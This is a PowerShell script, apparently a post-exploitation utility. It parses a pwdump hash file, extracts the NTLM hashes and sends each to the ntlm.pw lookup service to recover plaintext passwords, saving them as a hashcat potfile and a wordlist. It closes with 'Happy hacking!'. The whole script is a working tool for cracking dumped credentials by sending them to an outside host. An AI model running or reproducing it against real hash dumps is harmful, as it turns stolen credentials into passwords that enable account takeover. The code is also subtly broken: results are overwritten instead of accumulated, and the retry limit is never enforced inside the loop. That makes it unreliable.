# Initialize output paths for pot file append, for custom dictionary (ntlm.pw.txt), and temporary file
[string] $outpathdictionary = "<PATH TO WRITE DICTIONARY>"
[string] $outpathpotfile =  "<PATH TO WRITE POTFILE FORMATED OUTPUT>"
[string] $outpathpotfileTemp =  "<PATH TO WRITE TEMPORARY POTFILE FORMATED OUTPUT>"

# Reads the hash dump file
[string[]]$allHashes = get-content <PATH OF HASHDUMP FILE TO BE PROCCESSED>
[string[]]$hashesNTLM = @()


# Extracts and deduplicate NTLM hashes
$hashesNTLM = $allHashes | %{($_ -split ":")[3]} | select -Unique 

# Prints information about number of unique hashes extracted and expected time to run in hours
Write-host "Hashes to be tested against ntlm.pw: " $hashesNTLM.count
Write-host "Expected time to check all hashes: " (((($hashesNTLM.Count)/1000/60)*20)) "hours"

# Initializes time between retries if error or quota reached
$waitseconds= 90
# Initializes max retries information
$maxRetries = 20

# Initializes arrays for new potfile lines and for hashes not found in ntlm.pw
[string[]]$newpassespotfile= @{}
[string[]]$hashesNotFound= @()


# Cicle in the Hashes list
foreach ($hashresult in $hashesNTLM) {
    # Initialize retry counter and retry flag
    $retryCount = 0
    $retry = $true

    # Retry logic if flag is true, the code will retry up to reach $maxRetries threshold
    while ($retry) {
        # Try/catch to capture exception if occurs 
        try 
        {
            # Request ntlm.pw for specific hash
            $request = Invoke-WebRequest "https://ntlm.pw/$hashresult"

            # Status code 200, password found 
            if ($request.StatusCode -eq 200) 
            {
                # Extract password from response
                $pass = $request.Content
                Write-Host "Password found! : $pass"
                # Add hash plus password in "hash:cleartext" format (suitable to add to hashcat.potfile).
                $hashPotFormat = $hashresult +":" + $pass
                $newpassespotfile = $hashPotFormat
                # Temporary save to file to keep partial information
                # TODO: Resume logic (open temp file and avoid to retest existing hashes)
                $hashPotFormat | out-file $outpathpotfileTemp -encoding ASCII -Append 
                # Restore retry flag
                $retry = $false  # Terminate the retry loop on success
            }
            # Status code 204, empty content, so password not found 
            elseif  ($request.StatusCode -eq 204) 
            {
                # Add hash to the list of hashes not found (useful to later try to crack by other means)
                # TODO: keep complete hash line from pwdump format file
                $hashesNotFound += $hashresult
                # Restore retry flag
                $retry = $false  # Terminate the retry loop on not found
            }
            # Other status codes (no errors/exceptions)
            else
            {
                $hashesNotFound += $hashresult
                $retry = $false  # Terminate the retry loop for other status codes (not exception)
            }
        }
        # Exception handling 
        catch 
        {
            Write-Host "Exception occurred:  $($_.Exception.Message)"
            if ($_.Exception.Response.StatusCode -eq 429) 
            {
                Write-Host "Quota reached - Waiting $waitseconds seconds before retry... Position " $hashesNTLM.Indexof($hashresult) " of " $hashesNTLM.count " hashes."
            } 
            Start-Sleep -Seconds $waitseconds
            $retryCount++
        }
    }
    # We reach maximun retries threshold, so we skip
    if ($retryCount -ge $maxRetries) 
    {
        Write-Host "Exceeded maximum retries for hash $hashresult. Skipping."
        # Add hash to the list of hashes not found (useful to later try to crack by other means)
        $hashesNotFound += $hashresult
        $retry = $false # Terminate the retry loop for reaching threshold of retries.
    }
}

write-host "Number of passwords found: " $newpassespotfile.count " Happy hacking!"

# Ouput to files
# Output to Potfile format
$newpassespotfile | select -Unique | sort | out-file $outpathpotfile -encoding ASCII -Append
# Output to dictionary format (only cleartext passwords 1 per line)
$newpassespotfile | %{ ($_ -split ":")[1]} | select -Unique | sort | out-file $outpathdictionary -encoding ASCII -Append

